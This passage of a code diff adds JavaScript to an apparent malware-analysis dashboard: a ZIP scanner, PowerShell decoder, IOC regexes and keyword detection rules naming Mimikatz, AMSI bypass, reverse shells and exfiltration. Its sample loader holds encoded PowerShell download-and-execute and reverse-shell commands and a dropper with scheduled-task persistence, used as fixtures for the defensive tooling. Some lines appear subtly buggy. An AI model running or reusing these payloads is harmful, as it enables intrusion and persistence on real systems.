+  {kw:['downloadstring','downloadfile','net.webclient','webclient'],tag:'HIGH',tc:'th',sc:25,txt:'Remote payload download via WebClient.',m:'T1105'},
+  {kw:['bypass','executionpolicy'],tag:'HIGH',tc:'th',sc:20,txt:'ExecutionPolicy bypass.',m:'T1059.001'},
+  {kw:['hidden','windowstyle hidden'],tag:'HIGH',tc:'th',sc:18,txt:'Hidden window execution.',m:'T1059.001'},
+  {kw:['set-mppreference','disablerealtimemonitoring'],tag:'CRITICAL',tc:'tc',sc:35,txt:'Windows Defender disabled.',m:'T1562.001'},
+  {kw:['amsiutils','[ref].assembly','amsi.dll'],tag:'CRITICAL',tc:'tc',sc:30,txt:'AMSI bypass.',m:'T1562.001'},
+  {kw:['invoke-mimikatz','sekurlsa','lsadump'],tag:'CRITICAL',tc:'tc',sc:40,txt:'Mimikatz credential dump.',m:'T1003'},
+  {kw:['tcpclient','udpclient','net.sockets'],tag:'HIGH',tc:'th',sc:25,txt:'Reverse shell socket.',m:'T1049'},
+  {kw:['schtasks','new-scheduledtask'],tag:'HIGH',tc:'th',sc:18,txt:'Scheduled task persistence.',m:'T1053.005'},
+  {kw:['reg add','currentversion\\run'],tag:'HIGH',tc:'th',sc:20,txt:'Registry Run key persistence.',m:'T1547.001'},
+  {kw:['net user','net localgroup administrators'],tag:'HIGH',tc:'th',sc:22,txt:'Account manipulation.',m:'T1136'},
+  {kw:['frombase64string'],tag:'MEDIUM',tc:'tm',sc:12,txt:'Runtime base64 decode.',m:'T1027'},
+  {kw:['start-process','shellexecute'],tag:'MEDIUM',tc:'tm',sc:12,txt:'Process spawning.',m:'T1055'},
+  {kw:['-noprofile','-nop'],tag:'MEDIUM',tc:'tm',sc:8,txt:'-NoProfile flag.'},
+  {kw:['pastebin.com','hastebin','.onion'],tag:'HIGH',tc:'th',sc:20,txt:'Suspicious C2 source.',m:'T1105'},
+  {kw:['virtualallocex','writeprocessmemory'],tag:'CRITICAL',tc:'tc',sc:35,txt:'Process injection.',m:'T1055'},
+  {kw:['send-mailmessage','uploadfile'],tag:'HIGH',tc:'th',sc:18,txt:'Data exfiltration.',m:'T1041'},
+];
+
+function localAnalyzePS(text){
+  const l=text.toLowerCase();let score=0;const inds=[],mitre=[];
+  PS_RULES_LOCAL.forEach(r=>{if(r.kw.some(k=>l.includes(k))){score+=r.sc;inds.push({tag:r.tag,tc:r.tc,text:r.txt,mitre:r.m||''});if(r.m)mitre.push(r.m);}});
+  const obf=(text.match(/[`+'"]/g)||[]).length;
+  if(obf>12){score+=15;inds.push({tag:'HIGH',tc:'th',text:`Obfuscation: ${obf} chars.`,mitre:'T1027'});}
+  return{score:Math.min(score,100),indicators:inds,mitre:[...new Set(mitre)]};
+}
+
+function localExtractIOCs(text){
+  const ioc={ips:new Set(),domains:new Set(),urls:new Set(),hashes:new Set(),emails:new Set(),cves:new Set(),regkeys:new Set(),paths:new Set(),darkweb:new Set()};
+  (text.match(/\b(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?:\.(?:25[0-5]|2[0-4]\d|[01]?\d\d?)){3}\b/g)||[]).forEach(x=>{if(!x.startsWith('127.')&&!x.startsWith('0.'))ioc.ips.add(x);});
+  (text.match(/https?:\/\/[^\s"'<>]{4,}/g)||[]).forEach(x=>ioc.urls.add(x.replace(/[.,;)]+$/,'')));
+  (text.match(/\b([a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|xyz|tk|ml|top|site|click|online|pw|info)\b/gi)||[]).forEach(x=>{if(!/^(google|microsoft)/i.test(x))ioc.domains.add(x.toLowerCase());});
+  (text.match(/\b[a-fA-F0-9]{32}\b/g)||[]).forEach(x=>ioc.hashes.add('MD5:'+x));
+  (text.match(/\b[a-fA-F0-9]{64}\b/g)||[]).forEach(x=>ioc.hashes.add('SHA256:'+x));
+  (text.match(/\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b/g)||[]).forEach(x=>ioc.emails.add(x));
+  (text.match(/CVE-\d{4}-\d{4,7}/gi)||[]).forEach(x=>ioc.cves.add(x.toUpperCase()));
+  (text.match(/HK(?:LM|CU|CR|U|CC)\\[^\s"'<>\\]{3,}/gi)||[]).forEach(x=>ioc.regkeys.add(x));
+  (text.match(/[A-Za-z]:\\[^\s"'<>|]{4,}/g)||[]).forEach(x=>ioc.paths.add(x));
+  // Dark web / covert channel detection
+  (text.match(/\b[a-z2-7]{16,56}\.onion\b/gi)||[]).forEach(x=>ioc.darkweb.add('ONION:'+x.toLowerCase()));
+  (text.match(/(?:https?:\/\/)?t\.me\/[A-Za-z0-9_+]{3,}/g)||[]).forEach(x=>ioc.darkweb.add('TELEGRAM:'+x));
+  (text.match(/https?:\/\/(?:pastebin\.com|ghostbin\.co|hastebin\.com|rentry\.co|paste\.ee|paste\.sh|0paste\.com|justpaste\.it)\/[^\s"'<>]+/gi)||[]).forEach(x=>ioc.darkweb.add('PASTE:'+x));
+  (text.match(/https?:\/\/(?:transfer\.sh|file\.io|anonfiles\.com|ufile\.io)\/[^\s"'<>]+/gi)||[]).forEach(x=>ioc.darkweb.add('ANONFILE:'+x));
+  const r={};for(const k in ioc)r[k]=[...ioc[k]].slice(0,25);return r;
+}
+
+// ══════════════════════════════════════════════════════════
+// ZIP SCANNER
+// ══════════════════════════════════════════════════════════
+function dzDrag(e,on){e.preventDefault();$('dz').classList.toggle('drag',on);}
+function dzDrop(e){e.preventDefault();dzDrag(e,false);if(e.dataTransfer.files[0])handleZip(e.dataTransfer.files[0]);}
+function clearZip(){$('zipRes').classList.remove('on');$('dzFn').style.display='none';zipCache={};}
+
+async function handleZip(file){
+  if(!file||!file.name.endsWith('.zip')){toast('Upload a .zip file','r');return;}
+  $('dzFn').textContent='📦 '+file.name+' ('+fmtSize(file.size)+')';$('dzFn').style.display='block';
+  $('zipRes').classList.remove('on');$('fDetail').classList.remove('on');zipCache={};
+  $('zipLd').classList.add('on');
+  const steps=[['EXTRACTING...','reading structure'],['CLASSIFYING...','checking extensions'],['DECODING...','analyzing scripts'],['SCORING...','computing risk']];
+  for(const[m,s]of steps){$('zipLm').textContent=m;await sleep(320);}
+
+  if(backendOnline){
+    // ── BACKEND PATH ──
+    const fd=new FormData();fd.append('file',file);
+    try{
+      const r=await fetch(API_BASE+'/scan/zip',{method:'POST',body:fd});
+      const d=await r.json();
+      $('zipLd').classList.remove('on');
+      renderZipResult(d,file.name);
+      toast(`ZIP scanned — ${d.stats.threats} threat(s), ${d.stats.iocs} IOC(s)`,d.stats.threats>0?'r':'g');
+      addHistory('ZIP',file.name,d.risk_level,d.risk_score);
+      totalIOCs+=d.stats.iocs;updateHeader();
+    }catch(e){$('zipLd').classList.remove('on');toast('Backend error: '+e.message,'r');await localZipScan(file);}
+  } else {
+    await localZipScan(file);
+  }
+}
+
+async function localZipScan(file){
+  $('zipLd').classList.add('on');
+  const bytes=await file.arrayBuffer();
+  let zip;try{zip=await JSZip.loadAsync(bytes);}catch(e){$('zipLd').classList.remove('on');toast('Invalid ZIP','r');return;}
+  const files=[];let allText='',maxScore=0,threats=0,scripts=0,encoded=0,execs=0;
+  const archiveInds=[];const zipMitre=new Set();
+  const DANGEROUS=new Set(['.exe','.dll','.bat','.cmd','.vbs','.js','.jse','.hta','.scr','.pif','.com','.lnk','.msi','.reg']);
+  const SCRIPTS=new Set(['.ps1','.psm1','.psd1','.py','.sh','.rb','.php','.pl']);
+  const DOCUMENTS=new Set(['.docm','.xlsm','.pptm','.doc','.xls','.pdf']);
+  function classify(name){
+    const ext='.'+name.split('.').pop().toLowerCase();
+    if(DANGEROUS.has(ext))return{cls:'bad',icon:'💀',badge:'DANGER',btc:'th',score:30};
+    if(SCRIPTS.has(ext))return{cls:'warn',icon:'⚡',badge:'SCRIPT',btc:'tm',score:12};
+    if(DOCUMENTS.has(ext))return{cls:'warn',icon:'📄',badge:'MACRO?',btc:'tm',score:14};
+    if(['.txt','.log','.csv','.md','.xml','.json','.html'].includes(ext))return{cls:'ok',icon:'📝',badge:'TEXT',btc:'ti',score:0};
+    return{cls:'ok',icon:'📁',badge:'',btc:'ti',score:0};
+  }
+  for(const[path,zf]of Object.entries(zip.files)){
+    if(zf.dir)continue;
+    let content='';try{content=await zf.async('string');}catch(e){content='[binary]';}
+    const info=classify(path);const ext='.'+path.split('.').pop().toLowerCase();
+    let fileScore=info.score;const fileInds=[];let decoded=content,encType='NONE';
+    allText+=content+'\n';
+    if(SCRIPTS.has(ext))scripts++;if(DANGEROUS.has(ext))execs++;
+    if(content!=='[binary]'){
+      const dec=localDecodePS(content);decoded=dec.final;
+      const wasEnc=dec.layers.length>1||dec.layers[0].type!=='PLAIN TEXT';
+      if(wasEnc){encType=dec.layers.map(l=>l.type).join(' → ');encoded++;fileScore+=15;fileInds.push({tag:'ENCODED',tc:'tm',text:'Encoded: '+encType,mitre:'T1027'});}
+      const psa=localAnalyzePS(decoded);
+      if(psa.score>0){fileScore+=Math.round(psa.score/(SCRIPTS.has(ext)?3:2));fileInds.push(...psa.indicators);psa.mitre.forEach(m=>zipMitre.add(m));}
+    }
+    if(path.count>1&&DANGEROUS.has(ext)){fileScore+=20;fileInds.push({tag:'CRITICAL',tc:'tc',text:'Double extension.',mitre:'T1027'});}
+    if(/invoice|payment|urgent|password|update|install|verify/i.test(path)){fileScore+=12;fileInds.push({tag:'HIGH',tc:'th',text:'Social engineering filename.'});}
+    if(DOCUMENTS.has(ext)){fileScore+=15;fileInds.push({tag:'MEDIUM',tc:'tm',text:'Macro-enabled document.'});}
+    const ent=entropy(content.substring(0,5000));
+    if(ent>7){fileScore+=15;fileInds.push({tag:'HIGH',tc:'th',text:`Very high entropy (${ent.toFixed(2)}).`,mitre:'T1027'});}
+    else if(ent>5.5){fileScore+=8;fileInds.push({tag:'MEDIUM',tc:'tm',text:`High entropy (${ent.toFixed(2)}).`,mitre:'T1027'});}
+    fileScore=Math.min(fileScore,100);maxScore=Math.max(maxScore,fileScore);
+    if(fileScore>=50||DANGEROUS.has(ext))threats++;
+    const size=zf._data?.uncompressedSize||content.length;
+    zipCache[path]={content,decoded,encType,info,fileScore,fileInds,size,ent};
+    files.push({path,info,fileScore,size,ext,indicators:fileInds,mitre:[]});
+  }
+  const dangerCt=files.filter(f=>new Set(['.exe','.dll','.bat','.cmd','.vbs','.js','.hta','.scr','.lnk','.msi']).has(f.ext)).length;
+  if(dangerCt)archiveInds.push({tag:'CRITICAL',text:`${dangerCt} executable(s) in ZIP.`,mitre:'T1027'});
+  if(scripts)archiveInds.push({tag:'HIGH',text:`${scripts} script(s) detected.`,mitre:'T1059.001'});
+  if(encoded)archiveInds.push({tag:'HIGH',text:`${encoded} encoded payload(s).`,mitre:'T1027'});
+  if(!archiveInds.length)archiveInds.push({tag:'INFO',text:'No archive-level threats.'});
+  const iocs=localExtractIOCs(allText);
+  const iocTotal=Object.values(iocs).reduce((s,a)=>s+a.length,0);
+  const finalScore=Math.min(maxScore,100);
+  const fakeResult={risk_level:finalScore>=70?'HIGH':finalScore>=35?'MEDIUM':'LOW',risk_score:finalScore,
+    stats:{total:files.length,threats,scripts,encoded,executables:execs,iocs:iocTotal},
+    files,archive_indicators:archiveInds,iocs,mitre:[...zipMitre]};
+  $('zipLd').classList.remove('on');
+  renderZipResult(fakeResult,file.name);
+  totalIOCs+=iocTotal;addHistory('ZIP',file.name,fakeResult.risk_level,finalScore);
+  toast(`ZIP scanned — ${threats} threat(s), ${iocTotal} IOC(s)`,threats>0?'r':'g');
+}
+
+function renderZipResult(d,filename){
+  lastScanData.zip=d;
+  const{risk_level:lvl,risk_score:score,stats,files,archive_indicators:aInds,iocs,mitre}=d;
+  $('zTotal').textContent=stats.total;$('zThreats').textContent=stats.threats;
+  $('zScripts').textContent=stats.scripts;$('zEnc').textContent=stats.encoded;
+  $('zExe').textContent=stats.executables;$('zIOC').textContent=stats.iocs;
+  setRisk('zRK','zRV','zSN','zPB',score);
+  if(mitre&&mitre.length)$('zMitre').textContent='⚔️ '+mitre.slice(0,4).join(' · ');
+  const tree=$('ftree');tree.innerHTML='';
+  (files||[]).sort((a,b)=>b.score-a.score).forEach(f=>{
+    const depth=(f.path.split('/').length-1);
+    const info=f.info||{icon:'📁',cls:'ok',badge:'',btc:'ti'};
+    const badge=info.badge?`<span class="fb tag ${info.btc}">${info.badge}</span>`:'';
+    const col=f.score>=70?'var(--r)':f.score>=35?'var(--o)':'var(--g)';
+    tree.innerHTML+=`<li class="fti" onclick="showFileDetail('${esc(f.path)}',this)">
+      <span style="width:${depth*10}px;flex-shrink:0"></span><span class="fti-ic">${info.icon}</span>
+      <span class="fti-n ${info.cls}">${esc(f.path)}</span>${badge}
+      <span class="fti-sz">${fmtSize(f.size)}</span>
+      <span class="fti-sc" style="color:${col}">${f.score}</span></li>`;
+  });
+  $('zInds').innerHTML=(aInds||[]).map(i=>indItem(i.tag,i.tag==='CRITICAL'?'tc':i.tag==='HIGH'?'th':i.tag==='MEDIUM'?'tm':'ti',i.text,i.mitre||'')).join('');
+  renderIOCGrid(iocs||{},'zIOCs');
+  $('zTS').textContent='Scan: '+now();
+  $('zPdfRow').style.display='flex';
+  $('zipRes').classList.add('on');
+}
+
+function showFileDetail(path,el){
+  document.querySelectorAll('.fti').forEach(x=>x.classList.remove('sel'));el.classList.add('sel');
+  const f=zipCache[path];
+  const ext='.'+path.split('.').pop().toLowerCase();
+  const preview=(f?f.decoded||f.content:path).substring(0,1500)||'[no preview]';
+  $('fdName').textContent=path.split('/').pop();
+  const hasPS=/powershell|iex|webclient|base64|invoke/i.test(preview);
+  $('fdContent').innerHTML=(hasPS||['.ps1','.bat','.cmd'].includes(ext))?hlPS(preview):esc(preview);
+  $('fdContent').className='mono'+((f?.fileScore||0)>=70?' bad':(f?.fileScore||0)>=35?' warn':'');
+  if(f){
+    $('fdMeta').innerHTML=card('FILE',path,'info')+card('EXT',ext.toUpperCase())+card('SIZE',fmtSize(f.size))+card('ENCODING',f.encType,f.encType!=='NONE'?'warn':'ok')+card('ENTROPY',f.ent.toFixed(2),f.ent>7?'bad':f.ent>5.5?'warn':'ok')+card('RISK SCORE',f.fileScore+'/100',f.fileScore>=70?'bad':f.fileScore>=35?'warn':'ok');
+    renderEntropy(f.ent,'fdEntropy');
+  }
+  renderMitre([],'fdMitre');
+  $('fdInds').innerHTML=(f?.fileInds?.length?f.fileInds:[{tag:'INFO',tc:'ti',text:'No indicators.'}]).map(i=>indItem(i.tag,i.tc||'ti',i.text,i.mitre||'')).join('');
+  $('fDetail').classList.add('on');setTimeout(()=>$('fDetail').scrollIntoView({behavior:'smooth',block:'start'}),50);
+}
+
+// ══════════════════════════════════════════════════════════
+// PS ANALYZER
+// ══════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════
+// POWERSHELL DECODER — ENHANCED (File Upload + Analysis)
+// ══════════════════════════════════════════════════════════
+
+let psMode = 'text';   // 'text' | 'file'
+let psFileObj = null;  // the File object chosen
+
+function switchPSTab(mode){
+  psMode = mode;
+  $('psTabText').classList.toggle('active', mode==='text');
+  $('psTabFile').classList.toggle('active', mode==='file');
+  $('psTextPane').style.display = mode==='text'?'':'none';
+  $('psFilePane').style.display = mode==='file'?'':'none';
+  $('psSampleBtn').textContent = mode==='file' ? '⚗ SAMPLE FILE' : '⚗ SAMPLE';
+}
+
+function psFileChosen(input){
+  const f = input.files[0];
+  if(!f) return;
+  psFileObj = f;
+  $('psDZFn').style.display = 'block';
+  $('psDZFn').textContent = `📎 ${f.name}  (${fmtSize(f.size)})`;
+  $('psDZ').classList.remove('drag');
+  showPSFileMeta(f);
+  toast(`File selected: ${f.name}`,'c');
+}
+
+function psDrop(e){
+  e.preventDefault();
+  $('psDZ').classList.remove('drag');
+  const f = e.dataTransfer.files[0];
+  if(!f){ toast('No file dropped','r'); return; }
+  psFileObj = f;
+  $('psDZFn').style.display='block';
+  $('psDZFn').textContent = `📎 ${f.name}  (${fmtSize(f.size)})`;
+  showPSFileMeta(f);
+  toast(`File loaded: ${f.name}`,'c');
+}
+
+function showPSFileMeta(f){
+  const ext = f.name.includes('.') ? '.'+f.name.split('.').pop().toLowerCase() : '';
+  const dangerExts = new Set(['.hta','.exe','.bat','.cmd','.vbs','.js','.jse','.scr','.pif','.dll','.ps1']);
+  const extClass = dangerExts.has(ext) ? 'bad' : 'warn';
+  $('psFileMeta').innerHTML =
+    card('FILENAME', f.name) +
+    card('EXTENSION', ext.toUpperCase() || 'NONE', extClass) +
+    card('SIZE', fmtSize(f.size), f.size > 1e6 ? 'warn' : 'ok') +
+    card('TYPE', f.type || 'text/plain');
+  $('psFileInfo').style.display = '';
+}
+
+function loadPSSample(){
+  if(psMode==='file'){
+    // Create a synthetic blob to simulate a .ps1 file upload
+    const sampleContent = [
+      'powershell -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADoANAA0ADQANAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkA',
+      '',
+      '# Dropper — fetches secondary stage',
+      '$url = "http://192.168.1.1:4444/payload.hta"',
+      '$wc = New-Object Net.WebClient',
+      '$wc.DownloadFile($url, "$env:TEMP\\updater.hta")',
+      'Start-Process "$env:TEMP\\updater.hta"',
+      'schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -File $env:APPDATA\\svc.ps1" /sc onlogon',
+    ].join('\n');
+    const blob = new Blob([sampleContent], {type:'text/plain'});
+    psFileObj = new File([blob], 'sample_dropper.ps1', {type:'text/plain'});
+    $('psDZFn').style.display='block';
+    $('psDZFn').textContent = `📎 sample_dropper.ps1  (${fmtSize(blob.size)})`;
+    showPSFileMeta(psFileObj);
+    toast('Sample PS1 file loaded','c');
+  } else {
+    $('psIn').value='powershell -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACIALAA0ADQANAA0ACkA';
+    toast('Sample loaded','c');
+  }
+}
+
+function clearPS(){
+  $('psIn').value='';
+  psFileObj=null;
+  $('psDZFn').style.display='none';
+  $('psFileInfo').style.display='none';
+  $('psFileMeta').innerHTML='';
+  if($('psFileIn')) $('psFileIn').value='';
+  $('psRes').classList.remove('on');
+  $('psFileAnalysisSec').style.display='none';
+  $('psRawSec').style.display='none';
+}
+
+function renderEnhancedFindings(enhanced){
+  // Suspicious Extensions
+  const extList = enhanced.susp_extensions||[];
+  if(extList.length){
+    $('psExtHitsWrap').style.display='';
+    $('psExtHits').innerHTML = extList.map(f=>`
+      <li class="ii"><span class="tag ${f.tag==='CRITICAL'?'tc':f.tag==='HIGH'?'th':'tm'}">${esc(f.tag)}</span>
+        <div class="ii-body">
+          <span><strong>${esc(f.ext.toUpperCase())}</strong> — ${esc(f.text)}</span>
+          ${f.mitre?`<div class="ii-mitre">⚔️ ${esc(f.mitre)}</div>`:''}
+          ${f.context?`<div class="ii-ctx">…${esc(f.context)}…</div>`:''}
+        </div></li>`
+    ).join('');
+  } else $('psExtHitsWrap').style.display='none';
+
+  // Execution Flags
+  const flagList = enhanced.exec_flags||[];
+  if(flagList.length){
+    $('psFlagHitsWrap').style.display='';
+    $('psFlagHits').innerHTML = flagList.map(f=>
+      indItem(f.tag, f.tag==='CRITICAL'?'tc':f.tag==='HIGH'?'th':f.tag==='MEDIUM'?'tm':'ti',
+              esc(f.text), f.mitre||'')
+    ).join('');
+  } else $('psFlagHitsWrap').style.display='none';
+
+  // Suspicious URLs
+  const urlList = enhanced.susp_urls||[];
+  if(urlList.length){
+    $('psUrlHitsWrap').style.display='';
+    $('psUrlHits').innerHTML = urlList.map(f=>`
+      <li class="ii"><span class="tag ${f.tag==='CRITICAL'?'tc':f.tag==='HIGH'?'th':'tm'}">${esc(f.tag)}</span>
+        <div class="ii-body">
+          <span>${esc(f.text)}</span>
+          ${f.mitre?`<div class="ii-mitre">⚔️ ${esc(f.mitre)}</div>`:''}
+          ${f.context?`<div class="ii-ctx">…${esc(f.context)}…</div>`:''}
+        </div></li>`
+    ).join('');
+  } else $('psUrlHitsWrap').style.display='none';
+
+  // Obfuscation
+  const obfList = enhanced.obfuscation||[];
+  if(obfList.length){
+    $('psObfHitsWrap').style.display='';
+    $('psObfHits').innerHTML = obfList.map(f=>
+      indItem(f.tag, f.tag==='HIGH'?'th':'tm', esc(f.text), f.mitre||'')
+    ).join('');
+  } else $('psObfHitsWrap').style.display='none';
+
+  const anyHit = extList.length||flagList.length||urlList.length||obfList.length;
+  $('psFileAnalysisSec').style.display = anyHit ? '' : 'none';
+}
+
+function renderPSResult(d, isFile){
+  const score = d.risk_score;
+  const ent   = entropy(d.final||'');
+  setRisk('psRK','psRV','psSN','psPB',score);
+  if(d.mitre?.length) $('psMitreSum').textContent='⚔️ '+d.mitre.slice(0,4).join(' · ');
+  else $('psMitreSum').textContent='';
+
+  // File analysis card
+  if(isFile && d.enhanced){
+    $('psFileAnalysisSec').style.display='';
+    const s = d.summary||{};
+    const extCls = ['.hta','.jse','.scr','.pif','.exe'].includes(s.file_ext)?'bad':['.bat','.cmd','.vbs','.js','.ps1'].includes(s.file_ext)?'warn':'ok';
+    $('psFileAnalysisMeta').innerHTML =
+      card('FILENAME', s.filename||d.filename||'—') +
+      card('EXTENSION', (s.file_ext||'').toUpperCase()||'—', extCls) +
+      card('FILE SIZE', fmtSize(s.file_size||0)) +
+      card('SHA-256', (d.sha256||'').substring(0,16)+'…', 'info') +
+      card('FILE ENTROPY', (s.entropy||ent).toFixed(2), (s.entropy||ent)>7?'bad':(s.entropy||ent)>5.5?'warn':'ok') +
+      card('THREAT TYPE', s.threat_type||'GENERAL', score>=70?'bad':score>=35?'warn':'ok') +
+      card('EXEC FLAGS', s.exec_flags||0, (s.exec_flags||0)>0?'warn':'ok') +
+      card('SUSP EXTS', s.susp_extensions||0, (s.susp_extensions||0)>0?'warn':'ok') +
+      card('SUSP URLS', s.susp_urls||0, (s.susp_urls||0)>0?'warn':'ok');
+    renderEnhancedFindings(d.enhanced);
+
+    // Raw preview
+    if(d.raw_preview){
+      $('psRawSec').style.display='';
+      $('psRawPreview').innerHTML = hlPS(d.raw_preview.substring(0,2500));
+    }
+  } else {
+    $('psFileAnalysisSec').style.display='none';
+    $('psRawSec').style.display='none';
+    // Still render enhanced indicators for text input if backend returned them
+    if(d.enhanced) renderEnhancedFindings(d.enhanced);
+  }
+
+  // Decode chain
+  $('psChain').innerHTML=(d.layers||[]).map((l,i)=>`<div style="margin-bottom:10px">
+    <div class="st" style="font-size:.52rem">LAYER ${i+1}: ${esc(l.type)}</div>
+    <div class="mono" style="max-height:100px;${i===d.layers.length-1?'border-left-color:var(--g)':''}">${hlPS((l.result||'').substring(0,500))}</div></div>`).join('');
+
+  renderEntropy(ent,'psEntropy');
+  $('psFinal').innerHTML=hlPS((d.final||'').substring(0,2000));
+  $('psFinal').className='mono'+(score>=70?' bad':score>=35?' warn':'');
+  renderMitre(d.mitre||[],'psMitreGrid');
+
+  const iocTotal=Object.values(d.iocs||{}).reduce((s,a)=>s+a.length,0);
+  renderIOCGrid(d.iocs||{},'psIOCs');
+  totalIOCs+=iocTotal;
+
+  // Metadata cards
+  const raw = isFile ? (d.raw_preview||d.final||'') : (d.final||'');
+  const flags=[];
+  if(/-enc/i.test(raw))flags.push('-Enc');
+  if(/-nop/i.test(raw))flags.push('-NoP');
+  if(/bypass/i.test(raw))flags.push('-Bypass');
+  if(/hidden/i.test(raw))flags.push('-Hidden');
+  const cmdType = d.summary?.threat_type || (()=>{
+    const l=(d.final||'').toLowerCase();
+    if(l.includes('mimikatz')||l.includes('sekurlsa'))return'CREDENTIAL HARVESTER';
+    if(l.includes('tcpclient')||l.includes('sockets'))return'REVERSE SHELL';
+    if(l.includes('downloadstring')||l.includes('webclient'))return'REMOTE LOADER';
+    if(l.includes('schtasks')||l.includes('reg add'))return'PERSISTENCE DROPPER';
+    if(l.includes('amsi'))return'SECURITY BYPASS';
+    if(l.includes('iex')||l.includes('invoke-expression'))return'CODE EXECUTOR';
+    return'GENERAL COMMAND';
+  })();
+
+  $('psMeta').innerHTML =
+    card('SOURCE', isFile ? '📂 FILE' : '⌨️ TEXT') +
+    card('LAYERS', (d.layers||[]).length, 'info') +
+    card('ENCODING', (d.layers||[]).map(l=>l.type).join(' → ')) +
+    card('COMMAND TYPE', cmdType, score>=70?'bad':score>=35?'warn':'ok') +
+    card('ENTROPY', ent.toFixed(2), ent>7?'bad':ent>5.5?'warn':'ok') +
+    card('FLAGS', flags.join(' ')||'None', flags.length?'warn':'ok') +
+    card('MITRE HITS', (d.mitre||[]).length, (d.mitre||[]).length>2?'bad':(d.mitre||[]).length>0?'warn':'ok') +
+    card('IOCs', iocTotal, iocTotal>0?'warn':'ok') +
+    card('INDICATORS', (d.indicators||[]).length, (d.indicators||[]).length>3?'bad':(d.indicators||[]).length>1?'warn':'ok');
+
+  $('psInds').innerHTML=((d.indicators||[]).length?(d.indicators||[]):[{tag:'INFO',tc:'ti',text:'No indicators.'}])
+    .map(i=>indItem(i.tag, i.tc||(i.tag==='CRITICAL'?'tc':i.tag==='HIGH'?'th':i.tag==='MEDIUM'?'tm':'ti'), i.text, i.mitre||''))
+    .join('');
+
+  $('psTS').textContent='Analysis: '+now();
+  $('psRes').classList.add('on');
+  const label = isFile ? (d.filename||'file') : raw.substring(0,42)+'…';
+  addHistory('PS', label, d.risk_level, score);
+  updateHeader();
+  toast(`PS analyzed — ${score}/100, ${(d.mitre||[]).length} MITRE technique(s)`, score>=70?'r':score>=35?'c':'g');
+}
+
+async function analyzePS(){
+  $('psRes').classList.remove('on');
+  $('psLd').classList.add('on');
+
+  // ── FILE MODE ──────────────────────────────────────────
+  if(psMode==='file'){
+    if(!psFileObj){ $('psLd').classList.remove('on'); toast('Please select a file first','r'); return; }
+    $('psLdMsg').textContent = 'READING FILE...';
+    await sleep(400);
+    $('psLdMsg').textContent = 'SCANNING CONTENT...';
+
+    let d = null;
+    if(backendOnline){
+      try{
+        const fd = new FormData();
+        fd.append('file', psFileObj);
+        const r = await fetch(API_BASE+'/scan/ps/file', {method:'POST', body:fd});
+        d = await r.json();
+        if(d.error){ toast('Backend: '+d.error,'r'); $('psLd').classList.remove('on'); return; }
+      } catch(e){ d=null; toast('Backend error — falling back to local engine','o'); }
+    }
+
+    // Local fallback: read file client-side
+    if(!d){
+      try{
+        const text = await psFileObj.text();
+        const dec   = localDecodePS(text);
+        const analysis = localAnalyzePS(dec.final);
+        const enhanced = localEnhancedAnalysis(text, dec.final);
+        const iocs  = localExtractIOCs(text+'\n'+dec.final);
+        const score = Math.min(analysis.score + enhanced.score_delta, 100);
+        const ext   = psFileObj.name.includes('.') ? '.'+psFileObj.name.split('.').pop().toLowerCase() : '';
+        d = {
+          source:'file', filename:psFileObj.name, file_ext:ext,
+          file_size:psFileObj.size, sha256:'(local — not computed)',
+          entropy: entropyVal(text.substring(0,8000)),
+          risk_level: score>=70?'HIGH':score>=35?'MEDIUM':'LOW',
+          risk_score: score,
+          layers:dec.layers, final:dec.final,
+          indicators: analysis.indicators,
+          mitre: [...new Set([...analysis.mitre,...enhanced.extra_mitre])],
+          iocs, enhanced,
+          raw_preview: text.substring(0,3000),
+          summary:{
+            filename:psFileObj.name, file_ext:ext, file_size:psFileObj.size,
+            sha256:'(local)', entropy:entropyVal(text.substring(0,8000)),
+            exec_flags:enhanced.exec_flags.length,
+            susp_extensions:enhanced.susp_extensions.length,
+            susp_urls:enhanced.susp_urls.length,
+            threat_type:'GENERAL SCRIPT',
+          }
+        };
+      } catch(e){ $('psLd').classList.remove('on'); toast('Could not read file: '+e.message,'r'); return; }
+    }
+
+    $('psLd').classList.remove('on');
+    lastScanData.ps = d;
+    renderPSResult(d, true);
+    return;
+  }
+
+  // ── TEXT MODE ──────────────────────────────────────────
+  $('psLdMsg').textContent = 'DECODING...';
+  const raw = $('psIn').value.trim();
+  if(!raw){ $('psLd').classList.remove('on'); toast('Enter a command','r'); return; }
+  await sleep(700);
+  $('psLd').classList.remove('on');
+
+  let d;
+  if(backendOnline){
+    try{
+      const r = await fetch(API_BASE+'/scan/ps',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({payload:raw})});
+      d = await r.json();
+    } catch(e){ d=null; }
+  }
+  if(!d){
+    const dec = localDecodePS(raw);
+    const analysis = localAnalyzePS(dec.final);
+    const enhanced = localEnhancedAnalysis(raw, dec.final);
+    const iocs = localExtractIOCs(raw+'\n'+dec.final);
+    const score = Math.min(analysis.score + enhanced.score_delta, 100);
+    d = {
+      risk_level: score>=70?'HIGH':score>=35?'MEDIUM':'LOW',
+      risk_score: score,
+      layers:dec.layers, final:dec.final,
+      indicators:analysis.indicators,
+      mitre:[...new Set([...analysis.mitre,...enhanced.extra_mitre])],
+      iocs, enhanced, scan_id:null
+    };
+  }
+  lastScanData.ps = d;
+  renderPSResult(d, false);
+}
+
+// ── LOCAL ENHANCED ANALYSIS (offline fallback) ─────────
+function localEnhancedAnalysis(raw, decoded){
+  const text = raw + '\n' + decoded;
+  const lower = text.toLowerCase();
+
